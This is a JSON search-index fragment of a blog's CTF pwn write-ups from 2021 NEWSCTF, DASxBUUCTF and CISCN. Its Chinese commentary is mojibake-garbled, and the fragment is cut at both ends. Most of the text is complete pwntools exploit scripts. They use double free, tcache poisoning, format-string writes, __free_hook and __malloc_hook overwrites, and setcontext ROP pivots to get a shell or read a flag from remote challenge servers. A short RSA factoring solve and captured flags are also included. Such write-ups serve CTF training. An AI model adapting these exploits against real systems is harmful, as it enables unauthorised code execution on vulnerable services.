","date":"2021-06-04","objectID":"/2021newsctf/:1:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#checksec"},{"categories":["Writeups"],"content":"exp from os import system from pwn import * from pwnlib.ui import pause context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) libc = ELF('./libc-2.31.so') def add(size, data): p.sendlineafter('choice \u003e\u003e','1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('content:') p.send(data) def dele(idx): p.sendlineafter('choice \u003e\u003e','2') p.recvuntil('idx:') p.sendline(str(idx)) def edit(idx, data): p.sendlineafter('choice \u003e\u003e','4') p.recvuntil('idx:') p.sendline(str(idx)) p.recvuntil('content:') p.send(data) count = 0 while True: try: log.success('{}attempt'.format(count)) # p = process('./ntr_note',env={'LD_PRELOAD':'./libc-2.31.so'}) p = remote('81.68.86.115', 10000) add(0x50, '/bin/sh\\x00') # 0 add(0x30,'/bin/sh\\x00') # 1 dele(0) edit(0,'a'*0x10) dele(0) edit(0,p16(0x3010)) add(0x50, '/bin/sh\\x00') # 2==0 add(0x50, '\\x00'*64+'\\x00'*14+'\\xff'*2) # 3 tcache log.success('tcache get!') dele(0) edit(0,'a'*0x10) dele(2) dele(3) edit(2,p16(0x3010)) add(0x50,b'/bin/sh\\x00') # 4 # gdb.attach(p) edit(3,p16(0x36a0)) add(0x50,'a'*0x20) # 5 add(0x50,p64(0xfbad1800)+p64(0)*3+b'\\x00') # 6 libc_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) libcbase = libc_addr - libc.sym['_IO_2_1_stdin_'] leak('libcbase', libcbase) system = libcbase + libc.sym['system'] free_hook = libcbase + libc.sym['__free_hook'] log.success('libc addr get!') pause() edit(3,p64(0)*10) dele(1) edit(1,p64(free_hook)*3) edit(3,'\\xff'*30) add(0x30, '/bin/sh\\x00') # 7 add(0x30, p64(system)) # 8 dele(7) p.interactive() except: count = count+1 p.close() ","date":"2021-06-04","objectID":"/2021newsctf/:2:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#exp"},{"categories":["Writeups"],"content":"61happy","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#61happy"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-littl RELRO: Full RELRO Stack: No canary foun NX: NX enabled PIE: PIE enabled æ— é™çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œåœ¨æ ˆä¸Šæ‰¾æ ˆé“¾ï¼Œå¹¶leakå„æ®µçš„åŸºå€ã€‚é€šè¿‡æ ˆé“¾ï¼Œæ§åˆ¶æ ˆä¸Šä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘è¿”å›åœ°å€ï¼Œæœ€åé€€å‡ºç¨‹åºæ‰§è¡Œropã€‚ è¿™ä¸ªé¢˜æˆ‘ç”¨ogä¸€ä¸ªä¹Ÿæ²¡æœ‰æˆåŠŸï¼Œå•çº¯çš„pop rdi retè¿˜ä¼šè¦†ç›–æˆ‘çš„æ ˆé“¾ï¼Œæ‰€ä»¥é€‰æ‹©äº†pop rdi rbp retï¼Œä»è€Œè·³è¿‡æ ˆé“¾ï¼Œæœ€åé€šè¿‡system('/bin/sh')æ¥get shellã€‚ ","date":"2021-06-04","objectID":"/2021newsctf/:1:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#checksec-1"},{"categories":["Writeups"],"content":"exp from pwn import * # context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) # p = process('./qiandao',env={'LD_PRELOAD':'./libc-2.31.so'}) p = remote('81.68.86.115',10001) libc = ELF('./libc-2.31.so') def write(offset, gadget): # point to ret addr payload = '%{}c%9$hhn'.format(offset) p.send(payload.ljust(0x64,'\\x00')) # overwrite 1 bytes payload= '%{}c%37$hhn'.format(gadget) p.send(payload.ljust(0x64,'\\x00')) payload = '||%p||%7$p||%9$p||' # text, libc, stack p.sendline(payload) p.recvuntil('||') text_base = int(p.recvuntil('||',drop=True),16) - 0x914 libc_base = int(p.recvuntil('||',drop=True),16) - 243 - libc.sym['__libc_start_main'] stack_addr = int(p.recvuntil('||',drop=True),16) ret_addr = stack_addr - 0xf0 leak('text base', text_base) leak('libc base', libc_base) leak('ret_addr', ret_addr) pop_rdi = libc_base + 0x276e9 system = libc_base + libc.sym['system'] binsh = libc_base + 0x1b75aa offset = ret_addr\u00260xffff print(hex(offset)) gadget = [ pop_rdi\u00260xff, (pop_rdi\u003e\u003e8)\u00260xff, (pop_rdi\u003e\u003e16)\u00260xff, (pop_rdi\u003e\u003e24)\u00260xff, (pop_rdi\u003e\u003e32)\u00260xff ] leak('pop rdi',pop_rdi) string = [ binsh \u00260xff, (binsh\u003e\u003e8)\u00260xff, (binsh\u003e\u003e16)\u00260xff, (binsh\u003e\u003e24)\u00260xff, (binsh\u003e\u003e32)\u00260xff ] leak('bin sh',binsh) func = [ system\u00260xff, (system\u003e\u003e8)\u00260xff, (system\u003e\u003e16)\u00260xff, (system\u003e\u003e24)\u00260xff, (system\u003e\u003e32)\u00260xff, (system\u003e\u003e40)\u00260xff ] leak('system',system) # point to ret addr payload = '%{}c%9$hn'.format(offset) p.send(payload.ljust(0x64,'\\x00')) # overwrite 1 bytes payload= '%{}c%37$hhn'.format(gadget[0]) p.send(payload.ljust(0x64,'\\x00')) offset = ret_addr\u00260xff write(offset+1, gadget[1]) offset = offset + 8 write(offset, string[0]) write(offset+1, string[1]) write(offset+2, string[2]) offset = offset + 16 write(offset, func[0]) write(offset+1, func[1]) write(offset+2, func[2]) write(offset+3, func[3]) write(offset+4, func[4]) write(offset+5, func[5]) p.sendline('61happy'.ljust(0x64,'\\x00')) p.interactive() ","date":"2021-06-04","objectID":"/2021newsctf/:2:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#exp-1"},{"categories":["Writeups"],"content":"super_note","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#super_note"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: '/home/ctfpwn/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/' ä¸ç¬¬ä¸€é¢˜çš„åŠ«æŒæ€è·¯å·®ä¸å¤šï¼Œè¿™æ¬¡ntrå¸ˆå‚…å¥½å¿ƒç»™äº†ä½ å †åœ°å€çš„low 2 bytesï¼ˆæ·¦ï¼ï¼‰ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åŠ«æŒtcacheäº†ï¼Œä¹‹åè¿˜æ˜¯é€šè¿‡çˆ†ç ´åŠå­—èŠ‚ç”³è¯·åˆ°_IO_2_1_stdout_ï¼Œä»è€Œleak libcåœ°å€ã€‚ç„¶åï¼ŒåŠ«æŒfree_hookä¸ºputs_addrï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ³„éœ²æ ˆï¼ˆenvironï¼‰å’Œå †çš„åœ°å€äº†ã€‚æ¥ç€ï¼ŒåŠ«æŒtcacheçš„æŒ‡é’ˆéƒ¨åˆ†ï¼Œé…åˆåŠ«æŒfree_hookã€‚æˆ‘ä»¬å¯ä»¥ä»»æ„åœ°å€è¯»å†™ã€‚ è¿™é‡Œæˆ‘æœ¬æ¥æ˜¯æƒ³åœ¨æ ˆä¸Šæ„é€ orwï¼Œç„¶åshutdownæ¥æ‰§è¡Œçš„ï¼Œç»“æœmainæ ¹æœ¬æ²¡æœ‰retæŒ‡ä»¤ï¼ˆ æ‰€ä»¥è¿˜æ˜¯è¦é€šè¿‡setcontextæ¥è¿›è¡Œæ ˆè¿ç§»ï¼Œå…ˆé€šè¿‡ä»»æ„åœ°å€è¯»å†™ï¼Œåœ¨ä¸€æ®µè¿ç»­çš„ç©ºé—´å†™æˆ‘ä»¬çš„orwã€‚ç„¶åï¼Œå†æ‰¾ä¸€å—ç©ºé—´ç”¨æ¥è¿›è¡Œsetcontextçš„å¯„å­˜å™¨è®¾ç½®ã€‚åœ¨é«˜ç‰ˆæœ¬çš„libcä¸­setcontextçš„å¯„å­˜å™¨ä¸rbxæœ‰å…³äº†ï¼Œè¿˜æœ‰é€šè¿‡ä¸€ä¸ªgadgetæ¥æ§åˆ¶rdxçš„å€¼ ç”¨ropperæ‰¾ ropper -f ./libc-2.31.so --search 'mov rdx' å‘ç°è¿™æ ·ä¸€ä¸ªgadget 0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; æŠŠfree_hookè¦†ç›–ä¸ºè¿™ä¸ªgadgetï¼Œå¯ä»¥é€šè¿‡rdiæ§åˆ¶rdxï¼Œè¿›è€Œåœ¨rdx + 0x20çš„ä½ç½®å†™setcontext + 61çš„åœ°å€å°±å¯ä»¥æ‰§è¡Œorwã€‚ è¿™é‡Œè¿˜è¦æ³¨æ„rcxçš„å€¼ä¼šå½±å“rspã€‚ ","date":"2021-06-04","objectID":"/2021newsctf/:1:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#checksec-2"},{"categories":["Writeups"],"content":"exp from os import write from pwn import * from pwnlib.ui import pause context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) # # p = process('./super_note',env={'LD_PRELOAD':'./libc-2.31.so'}) p = remote('81.68.86.115', 10002) libc = ELF('./libc-2.31.so') def add(idx, size): p.sendlineafter('choice:','1') p.recvuntil('index:') p.sendline(str(idx)) p.recvuntil('size:') p.sendline(str(size)) def edit(idx, data): p.sendlineafter('choice:','2') p.recvuntil('index:') p.sendline(str(idx)) p.recvuntil('content:') p.send(data) def show(idx): p.sendlineafter('choice:','3') p.recvuntil('index:') p.sendline(str(idx)) def dele(idx): p.sendlineafter('choice:','4') p.recvuntil('index:') p.sendline(str(idx)) # double free add(0,0x50) # 0 show(0) p.recvuntil('address:[') heap_base = int(p.recvuntil(']\\n',drop=True),16) - 0x3a0 - 0x1000 - 0x560 tcache = heap_base + 0x10 leak('heap base',heap_base) add(1,0x30) # 1 dele(0) # 0 edit(0,'a'*0x10) dele(0) # 0-0 edit(0,p16(tcache)) # 0-tcache add(0,0x50) # -tcache add(2, 0x50) # tcache edit(2,'\\x00'*64+'\\x00'*14+'\\xff'*2) log.success('tcache get!') dele(0) # 0 edit(0,'a'*0x10) dele(0) # 0-0 dele(2) # ub-tcache edit(0,p16(tcache)) # 0-tcache add(0, 0x50) # -tcache edit(2,p16(0x26a0)) # -tcache-stdout add(3, 0x50) # tcache edit(3,'a'*0x20) add(4, 0x50) # stdout edit(4,p64(0xfbad1800)+p64(0)*3+b'\\x00') libc_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) libcbase = libc_addr - libc.sym['_IO_2_1_stdin_'] leak('libcbase', libcbase) puts_addr = libcbase + libc.sym['puts'] free_hook = libcbase + libc.sym['__free_hook'] # 0x00000000001547a0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; getkeyserv_handle = libcbase + 0x1547a0 open_addr = libcbase + libc.sym['open'] read_addr = libcbase + libc.sym['read'] write_addr = libcbase + libc.sym['write'] setcontext = libcbase + libc.sym['setcontext'] +61 pop_rdi = libcbase + 0x26b72 pop_rsi = libcbase + 0x27529 pop_rax = libcbase + 0x4a550 pop_rsp = libcbase + 0x32b5a pop_rax_rdx_rbx = libcbase + 0x1626d5 syscall_ret = libcbase + 0x66229 log.success('libc addr get!') edit(3,p64(0)*10) # tcache dele(1) # 0x40-\u003e1 edit(1,p64(free_hook)) # 1-\u003efree_hook edit(3,'\\xff'*30) add(1,0x30) add(5,0x30) # free_hook edit(5,p64(puts_addr)) dele(0) heap_base = u64(p.recvuntil(b'\\x0a',drop=True)[-6:].ljust(8,b'\\x00')) - 0x10 leak('heap base',heap_base) orw_part_1 = heap_base + 0x2000 orw_part_2 = orw_part_1 + 0x60 set_chunk = orw_part_2 + 0x60 edit(5,p64(0)) edit(5,p64(0)) add(6,0x60) edit(3,p16(1)*10) dele(6) edit(6,p64(heap_base+0x90)) # tcache entry* add(6,0x60) add(6,0x60) edit(6,p64(orw_part_1)*12) edit(3,p16(7)*10) add(8,0x60) flag = orw_part_1 + 0x60 + 9*8 # open('./flag',0) payload = p64(pop_rdi)+p64(666)+p64(pop_rdi) + p64(flag) + p64(pop_rax) + p64(2) + p64(syscall_ret) # read(3, flag+8, 0x100) payload+= p64(pop_rdi) + p64(3) +p64(pop_rsi)+p64(flag+8)+ p64(pop_rax_rdx_rbx) # + p64(0) +p64(heap_base) #+p64(heap_base)+p64(0) + p64(syscall_ret) edit(8,payload) edit(3,p16(7)*10) edit(6,p64(orw_part_2)*12) add(9,0x60) payload = p64(0) +p64(0x100)+p64(0) + p64(syscall_ret) # write(1,flag+8,0x100) payload+= p64(pop_rdi) + p64(1) + p64(pop_rax) + p64(1) + p64(syscall_ret) + b'./flag\\x00' edit(9,payload) edit(6,p64(set_chunk)*12) add(10,0x60) payload = p64(0) + p64(set_chunk) +p64(0)*2+ p64(setcontext) edit(10,payload.ljust(0x60,'\\x00')) edit(6,p64(set_chunk+0x60)*12) add(11,0x60) payload = p64(0)*3 + p64(orw_part_1) + p64(80) + p64(88) + p64(0)+p64(0)+p64(orw_part_1+0x8) + p64(pop_rdi) edit(11,payload.ljust(0x60,'\\x00')) # gdb.attach(p,'b *free') edit(5,p64(getkeyserv_handle)) log.success('start aaattttack !!!!!!!!!!!') dele(10) # edit(3,p64(0)*10) # tcache # dele(1) # 0x40-\u003e1 # edit(1,p64(env)) # 1-\u003eenv # edit(3,'\\xff'*30) # add(1,0x30) # add(6,0x30) # env # edit(5,p64(puts_addr)) # dele(6) # stack_addr = u64(","date":"2021-06-04","objectID":"/2021newsctf/:2:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#exp-2"},{"categories":["Writeups"],"content":"ç­¾åˆ°%3Dæ”¹æˆ=ï¼Œæ‰”åˆ°cyberchef ","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#ç­¾åˆ°"},{"categories":["Writeups"],"content":"RAS256 def RSA_File(): public_name = input(\"è¯·è¾“å…¥å…¬é’¥æ–‡ä»¶å(æ²¡æœ‰ç›´æ¥å›è½¦)ï¼š\") flag_name = input(\"è¯·è¾“å…¥åŠ å¯†æ–‡ä»¶åï¼š\") private_name = input(\"è¯·è¾“å…¥ç§é’¥æ–‡ä»¶å(æ²¡æœ‰ç›´æ¥å›è½¦)ï¼š\") with open(flag_name, 'rb') as f: c = bytes_to_long(f.read()) if private_name == \"\": pass else: with open(private_name, 'r') as private: Key = RSA.importKey(private.read()) n, e, d, p, q = Key.n, Key.e, Key.d, Key.p, Key.q m = pow(c, d, n) print(\"æ˜æ–‡ï¼š\", libnum.n2s(m)) return with open(public_name, 'r') as public: key = RSA.importKey(public.read()) n, e = key.n, key.e print(\"n=\", n) print(\"e=\", e) print(\"c=\", c) è§£å¾— n = 98432079271513130981267919056149161631892822707167177858831841699521774310891 e = 65537 c = 6793000449683458761243147198477390385097096925500467689087326832717298959098 c = 70099856477856647119324475779448956753505959373194081911451122574748717928011 c = 5077560311513279671817430508125151837396585328082180175253360345086848717946 256çš„næš´åŠ›åˆ†è§£ï¼Œå¾—åˆ°pï¼Œq p = 302825536744096741518546212761194311477 q = 325045504186436346209877301320131277983 p = 302825536744096741518546212761194311477 q = 325045504186436346209877301320131277983 e = 65537 c = int(input(\"c=\")) phi = (p - 1) * (q - 1) n = p * q d = gmpy2.invert(e, phi) m = pow(c, d, n) #print(\"æ˜æ–‡ï¼š\", libnum.n2s(m)) string = long_to_bytes(m) print(string) ","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#ras256"},{"categories":["Writeups"],"content":"å®‰æ’äº”æœˆèµ›å¸¸è§„pwn ","date":"2021-06-03","objectID":"/2021dasxbuuctf-may/:0:0","series":null,"tags":["Writeups"],"title":"2021DASxBUUCTF May","uri":"/2021dasxbuuctf-may/#å®‰æ’äº”æœˆèµ›"},{"categories":["Writeups"],"content":"ticketdeleå‡½æ•°ä¸­ï¼Œæ²¡æœ‰æ£€æŸ¥ä¸‹æ ‡ä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ageæ¥ä¼ªé€ chunkæŒ‡é’ˆæ„æˆdouble freeï¼Œç„¶åmalloc_hookå’Œrealloc_hooké…åˆget shell from pwn import * context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) # p = process('./ticket',env={'LD_PRELOAD':'./libc-2.23.so'}) p = remote('node3.buuoj.cn',27905) libc =ELF('./libc-2.23.so') def add(idx, size): p.sendlineafter('\u003e\u003e ','1') p.sendlineafter('Index: ', str(idx)) p.sendlineafter('size: ', str(size)) def dele(idx): p.sendlineafter('\u003e\u003e ','2') p.sendlineafter('Index: ', str(idx)) def edit(idx,data): p.sendlineafter('\u003e\u003e ','3') p.sendlineafter('Index: ', str(idx)) p.sendafter('remarks: ',data) def show(idx): p.sendlineafter('\u003e\u003e ','4') p.sendlineafter('Index: ', str(idx)) def edit_info(name,say,age): p.sendlineafter('\u003e\u003e ','5') p.sendlineafter('name: ', str(name)) p.sendlineafter('fei):', str(say)) p.sendlineafter('age: ',str(age)) def show_info(): p.sendlineafter('\u003e\u003e ','6') p.sendlineafter('name: ', 'name') p.sendlineafter('fei):', 'say') p.sendlineafter('age: ',str(0x101)) add(0,0x100) add(1,0x20) add(2,0x60) add(3,0x60) add(4,0x60) add(5,0x60) dele(0) add(0,0x100) show(0) malloc_hook = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) -88 -0x10 libcbase = malloc_hook - libc.sym['__malloc_hook'] leak('libc base',libcbase) realloc = libcbase + libc.sym['realloc'] one = [0x45216, 0x4526a, 0xf02a4, 0xf1147] og = libcbase + one[1] dele(-1) dele(-2) show_info() p.recvuntil('Name: ') heap = u64(p.recvuntil('\\n',drop= True).ljust(8,'\\x00')) - 0x30 + 0x1a0+0x10 leak('heap',heap) dele(0) dele(1) dele(2) # 60 edit_info(p64(heap),p64(heap),heap) dele(3) # 60 dele(-3) # 60 add(0,0x60) edit(0,p64(malloc_hook-0x23)) add(1,0x60) add(2,0x60) add(3,0x60) # malloc_hook edit(3,'a'*(13-2)+p64(og)+p64(realloc)) # gdb.attach(p) dele(1) add(1,0x20) p.interactive() ","date":"2021-06-03","objectID":"/2021dasxbuuctf-may/:0:0","series":null,"tags":["Writeups"],"title":"2021DASxBUUCTF May","uri":"/2021dasxbuuctf-may/#ticket"},{"categories":["Writeups"],"content":"cardeditæœ‰off-by-oneï¼Œæ‰“tcache_structæ¥leak libcï¼Œç„¶åmalloc_hookå†™og from pwn import * context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) # env={'LD_PRELOAD':'./libc.so'} # p = process('./pwn') p = remote('node3.buuoj.cn',26067) libc = ELF('./libc.so') def add(idx,size,data): p.sendlineafter('choice:','1') p.recvuntil('card:') p.sendline(str(idx)) p.recvuntil('power:') p.sendline(str(size)) p.recvuntil('quickly!') p.send(data) def dele(idx): p.sendlineafter('choice:','3') p.recvuntil('card:') p.sendline(str(idx)) def edit(idx,data): p.sendlineafter('choice:','2') p.recvuntil('card') p.sendline(str(idx)) p.recvuntil('show') p.sendline(data) def show(idx): p.sendlineafter('choice:','4') p.recvuntil('index:') p.sendline(str(idx)) one = [0x4f2c5, 0x4f322, 0x10a38c] add(0, 0x18, '0'*8) # 0x20 add(1, 0x38, '1'*8) # 0x40 add(2, 0x38, '2'*8) # 0x40 add(3, 0x38, '3'*8) # 0x40 edit(0,'a'*0x18+'\\x81') dele(1) dele(3) dele(2) add(1, 0x78, '\\x00') # 0x81 show(1) heap = u64(p.recvuntil('\\x56')[-6:].ljust(8,'\\x00')) -0x2c0 -0x40 leak('heap',heap) tcache = heap + 0x10 payload = '\\x00'*0x38 + p64(0x41) + p64(tcache) edit(1,payload) add(2, 0x38, 'A'*18) add(3, 0x38, 'A'*38) # tcache dele(3) add(3, 0x68,'a'*8) show(3) malloc_hook = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 672 - 0x10 leak(\"malloc_hook\",malloc_hook) libcbase = malloc_hook - libc.sym['__malloc_hook'] free_hook = libcbase + libc.sym['__free_hook'] leak('libcbase',libcbase) og = libcbase + one[2] edit(3,p64(malloc_hook)*13) # show(3) add(6,0x20,p64(og)*2) # gdb.attach(p) p.sendlineafter('choice:','1') p.recvuntil('card:') p.sendline(str(7)) p.recvuntil('power:') p.sendline(str(66)) p.interactive() ","date":"2021-06-03","objectID":"/2021dasxbuuctf-may/:0:0","series":null,"tags":["Writeups"],"title":"2021DASxBUUCTF May","uri":"/2021dasxbuuctf-may/#card"},{"categories":["Writeups"],"content":"Ciscn2021-pwnå›½èµ›éƒ¨åˆ†pwné¢˜çš„è§£ç­” ","date":"2021-05-26","objectID":"/ciscn2021-pwn/:0:0","series":null,"tags":["Writeups"],"title":"Ciscn2021 Pwn","uri":"/ciscn2021-pwn/#ciscn2021-pwn"},{"categories":["Writeups"],"content":"lonelywolfdouble_free leak heap address ï¼Œæ‰“tcache_struct,leak libcï¼Œæ§åˆ¶ nextæŒ‡é’ˆè¦†å†™__malloc_hookä¸ºog from pwn import * context.terminal = ['tmux', 'splitw', '-h'] context(arch = 'amd64' , os = 'linux', log_level='debug') # p = process(\"./lonelywolf\",env={'LD_PRELOAD':\"./libc-2.27.so\"}) p = remote('123.60.210.12',21885) def add(size): p.sendlineafter(\"Your choice: \", '1') p.sendlineafter(\"Index:\", '0') p.sendlineafter(\"Size:\", str(size)) def delete(): p.sendlineafter(\"Your choice: \", '4') p.sendlineafter(\"Index:\", '0') def edit(payload): p.sendlineafter(\"Your choice: \", '2') p.sendlineafter(\"Index:\", '0') p.sendlineafter(\"Content: \", payload) def show(): p.sendlineafter(\"Your choice: \", '3') p.sendlineafter(\"Index:\", '0') libc = ELF('./libc-2.27.so') one = [0x4f3d5,0x4f432,0x10a41c] if __name__ == \"__main__\": add(0x78) delete() edit('8'*9) delete() show() heap_base = u64(p.recvuntil('\\x55')[-6:].ljust(8,'\\x00')) - 0x260 print(hex(heap_base)) # edit('8'*9) # delete() # pause() edit(p64(heap_base+0x10)) add(0x78) add(0x78) # ub edit('A'*0x30) # add(0x10) delete() show() malloc_hook = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 96 - 0x10 libcbase = malloc_hook - libc.sym['__malloc_hook'] print(hex(libcbase)) # add(0x78) edit(p64(malloc_hook)*10) add(0x10) og = libcbase+one[2] edit(p64(og)) # gdb.attach(p) show() p.interactive() flag = CISCN{iMf3k-MX3gi-NxKKS-IWx8t-5HlNV-} ","date":"2021-05-26","objectID":"/ciscn2021-pwn/:0:0","series":null,"tags":["Writeups"],"title":"Ciscn2021 Pwn","uri":"/ciscn2021-pwn/#lonelywolf"},{"categories":["Writeups"],"content":"pwnyæ•°ç»„è¶…ç•Œï¼Œä½¿ç”¨fini_arrayæ³„éœ²ç¨‹åºåŸºå€ï¼Œenvironæ³„éœ²æ ˆï¼Œè¦†ç›–è¿”å›åœ°å€ä¸ºog from pwn import * context.terminal = ['tmux', 'splitw', '-h'] context(arch = 'amd64' , os = 'linux', log_level='debug') # p = process(\"./pwny\",env={'LD_PRELOAD':\"./libc-2.27.so\"}) libc = ELF('./libc-2.27.so') def read(idx): p.sendlineafter('Your choice: ','1') p.sendafter('Index:',p64(idx)) def write(idx,data): p.sendlineafter('Your choice: ','2') p.sendlineafter('Index:',str(idx)) p.sendline(data) one = [0x4f3d5,0x4f432,0x10a41c] # fini_array = 0x201D88 # base = 0x202060 if __name__ == \"__main__\": p = remote('123.60.210.12',21970) p.sendlineafter('Your choice: ','2') p.sendlineafter('Index:',str(256)) p.sendlineafter('Your choice: ','2') p.sendlineafter('Index:',str(256)) write(256, '\\x00'*8) read(0xfffffffffffffffc) p.recvuntil('Result: ') stderr_addr = int(p.recv(12),16) libcbase = stderr_addr - libc.sym['_IO_2_1_stderr_'] print(hex(stderr_addr)) print(hex(libcbase)) # idx = 0xfffffffffffffffc-1 read(0xffffffffffffffa5) # gdb.attach(p) p.recvuntil('Result: ') text_addr = int(p.recv(12),16) textbase = text_addr - 0x9c0 print(hex(textbase)) env = libcbase + libc.sym['environ'] print(hex(env)) # stack = env - 0x10 base = 0x202060 + textbase print(hex(base)) # pause() idx = (env - base)/8 # idx = (~idx) + 1 # print(hex(idx)) read(idx) p.recvuntil('Result: ') stack_addr = int(p.recv(12),16) ret_addr = stack_addr - 0x120 print(hex(ret_addr)) og = libcbase + one[2] idx = (ret_addr - base )/8 # gdb.attach(p) write(idx, p64(og)) p.interactive() flag = CISCN{5o9ui-tLK7G-D1sUb-VrApG-dIhAm-} ","date":"2021-05-26","objectID":"/ciscn2021-pwn/:0:0","series":null,"tags":["Writeups"],"title":"Ciscn2021 Pwn","uri":"/ciscn2021-pwn/#pwny"},{"categories":["Writeups"],"content":"silverwolfæ³„æ¼libcå’ŒåŠ«æŒ__free_hookå’Œlonelyä¸€æ ·ï¼Œæ‰¾chunkåˆ†å¼€å†™ROPï¼Œåˆ©ç”¨setcontextæ¥æ§åˆ¶æ ˆè¿ç§»ï¼Œéœ€è¦ä¸¤æ¬¡æ ˆè¿ç§»ã€‚ from pwn import * context.terminal = ['tmux', 'splitw', '-h'] context(arch='amd64', os='linux', log_level='debug') # p = process(\"./silverwolf\", env={'LD_PRELOAD': \"./libc-2.27.so\"}) libc = ELF('./libc-2.27.so') p = remote('123.60.210.12', 21921) def add(size): p.sendlineafter(\"Your choice: \", '1') p.sendlineafter(\"Index:\", '0') p.sendlineafter(\"Size:\", str(size)) def delete(): p.sendlineafter(\"Your choice: \", '4') p.sendlineafter(\"Index:\", '0') def edit(payload): p.sendlineafter(\"Your choice: \", '2') p.sendlineafter(\"Index:\", '0') p.sendlineafter(\"Content: \", payload) def show(): p.sendlineafter(\"Your choice: \", '3') p.sendlineafter(\"Index:\", '0') if __name__ == \"__main__\": add(0x58) delete() edit('8'*9) delete() show() p.recvuntil(\"Content: \") heap_base = u64(p.recv(6)+'\\x00'*2) - 0x1880 print(hex(heap_base)) # gdb.attach(p) edit(p64(heap_base + 0x10)) add(0x58) add(0x58) # ub edit('\\x07'*0x30) delete() show() p.recvuntil(\"Content: \") libcbase = u64(p.recv(6)+'\\x00'*2) - 0x3ebca0 free_hook = libcbase + libc.sym['__free_hook'] write_addr = libcbase + libc.sym['write'] setcontext = libcbase + libc.sym['setcontext']+53 print(hex(libcbase)) pop_rdi = 0x215bf + libcbase pop_rsi = 0x23eea + libcbase pop_rax = 0x43ae8 + libcbase pop_rdx = 0x01b96 + libcbase pop_rsp = 0x03960 + libcbase read_call = 0x110140 + libcbase syscall_ret = 0xd2745 + libcbase payload = '\\x01\\x00\\x00\\x00\\x00\\x07\\x07'+ '\\x00'*(64 - 7) + p64(free_hook) + p64(0) * 2 edit(payload) add(0x10) edit(p64(setcontext)) add(0x68) add(0x68) add(0x68) edit(p64(heap_base+0x1210+8)+p64(pop_rdi)) add(0x78) add(0x78) payload=p64(read_call)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x30)+p64(write_addr) edit(payload) add(0x78) flag = heap_base+0x1210+8+0x60 orw = '' orw+= p64(pop_rdi)+p64(flag)+p64(pop_rax)+p64(2)+p64(syscall_ret) orw+= p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x30) orw+= p64(pop_rsp)+p64(heap_base+0x1210-0xa0) edit(orw+\"./flag\\x00\") #gdb.attach(p) delete() p.interactive() flag = CISCN{NEqT9-o7fw0-qYWHr-uPwKk-qJj0T-} ","date":"2021-05-26","objectID":"/ciscn2021-pwn/:0:0","series":null,"tags":["Writeups"],"title":"Ciscn2021 Pwn","uri":"/ciscn2021-pwn/#silverwolf"},{"categories":["Writeups"],"content":"Challenges_100-Week_10 Challenges Tricks pwnble.tw-silver_bullet stack overflow pwnable.tw-applestore UAF in stack pwnable.tw-Re-alloc UAF+tcache poisoning pwnable.tw-Tcache Tear tcache poisoning Lilac 2021 äº”ä¸€æ¬¢ä¹èµ›-babyFAT æ•°ç»„è¶…ç•Œ Lilac 2021 äº”ä¸€æ¬¢ä¹èµ›-befunge æ•°ç»„è¶…ç•Œ Lilac 2021 äº”ä¸€æ¬¢ä¹èµ›-noleak house_of_roman+IO_file leak ","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 